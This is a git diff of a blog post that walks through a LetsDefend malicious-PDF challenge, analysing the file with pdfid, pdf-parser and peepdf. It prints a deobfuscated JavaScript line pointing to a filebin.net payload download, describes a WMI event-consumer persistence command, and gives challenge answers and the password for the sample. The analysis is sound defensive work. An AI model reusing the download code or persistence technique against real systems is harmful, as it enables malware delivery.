@@ -12,10 +12,10 @@ Welcome back to yet another blog post where I will be tackling a Maldoc kinda ch
 We are told that an employee has received a suspicious email with the following contents:
 
 > **From**: SystemsUpdate@letsdefend.io 
-**To**: Paul@letsdefend.io 
-**Subject**: Critical - Annual Systems UPDATE NOW 
-**Body**: Please do the dutiful before the deadline today. 
-**Attachment**: [Update.pdf](https://drive.google.com/file/d/1_P5rsU1LCHYW--36TbhYqA841VeAZ6VE/view) Password: `letsdefend`
+> **To**: Paul@letsdefend.io 
+> **Subject**: Critical - Annual Systems UPDATE NOW 
+> **Body**: Please do the dutiful before the deadline today. 
+> **Attachment**: [Update.pdf](https://drive.google.com/file/d/1_P5rsU1LCHYW--36TbhYqA841VeAZ6VE/view) Password: `letsdefend`
 
 The employee has reported this incident to us and mentioned that they did not download or open the attachment as they found it very suspicious. With this in mind, i proceeded to download the attachment from [GoogleDrive](https://drive.google.com/file/d/1_P5rsU1LCHYW--36TbhYqA841VeAZ6VE/view) and extracted it with the password: `letsdefend`
 
@@ -73,7 +73,7 @@ Lets try and demystify what each of this mean:
 - `/Launch 2` Indicates that there are 2 launch actions. This can be used to run an application or execute code, and is often associated with malicious PDFs.
 - `/EmbeddedFile 0` -  Indicates that there are no embedded files within the PDF.
 
-With in mind, we can also use another tool called `pdf-parser` to analyse the PDFs statistics. 
+With that in mind, we can also use another tool called `pdf-parser` to analyse the PDFs statistics. 
 
 > _The `pdf-parser` is a Python script that can be used to parse PDF documents and analyze their structure. This tool is particularly useful for analyzing suspicious or malicious PDF files, or for exploring the internals of a PDF document. It is part of the DidierStevensSuite, a set of Python tools developed by Didier Stevens for handling various file formats._
 
@@ -133,6 +133,10 @@ From the `DestinationPath` shown above, we see the name of the payload is `D0csz
 
 ## 3. What file type would this have been if it were created?
 
+Carefully looking at the payload name (`D0csz1p`). This seemed more like a `Doc.zip` to me, so i submitted zip as my answer.🙂
+
+`zip`
+
 ## 4. Which external web domain would the malware have attempted to interact with?
 
 Inspecting the strings further, we get:
@@ -141,7 +145,22 @@ Inspecting the strings further, we get:
 
 This code looks like some obfuscated JavaScript code that uses a technique known as a packed script. In this obfuscated code, there is an `eval` function that is intended to execute the deobfuscated JavaScript code.
 
-If we attempt to deobfuscate this and have a cleaner code, we get:
+I thought `pdf-parser` & `pdfid` didn't pickup Javascript objects/code.
+
+![think](https://media.giphy.com/media/hv53DaYcXWe3nRbR1A/giphy.gif)
+
+Lets use another tool called [peepdf](https://eternal-todo.com/tools/peepdf-pdf-analysis-tool).
+
+Executing it with `-i` flag, we get into an interactive mode & `-f`  to ignore any errors.
+
+![image](https://user-images.githubusercontent.com/58165365/248580761-1311388a-009d-4f8e-9006-b7ea10a37e3f.png)
+
+From the screenshot above, we now see 2 objects with JS code.
+
+If we use the `js_code` command with the object id containing the JS, we get the Original and Next Stage code.
+
+![image](https://user-images.githubusercontent.com/58165365/248581562-2c90a2db-abfc-4be4-9d88-c7e8152717b3.png)
+
 
 ```javascript
 var url = "https://filebin.net/0flqlz0hiz6o4l32/D0csz1p";
@@ -237,7 +256,7 @@ The second command creates a command line event consumer. Basically, this is the
 
 `CommandLineTemplate="C:\Users\%USERPROFILE%\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\wallpaper482.scr"` specifies where the downloaded file (wallpaper482.scr) will be saved on the system.
 
-With this in mind, we know that `Powerpnt.exe` is aknown LOLBin used to download payloads from remote servers.
+With this in mind, we know that `Powerpnt.exe` is a known LOLBin used to download payloads from remote servers.
 
 For more information, feel free to check the [lolbas-project](https://lolbas-project.github.io/lolbas/OtherMSBinaries/Powerpnt/)
 
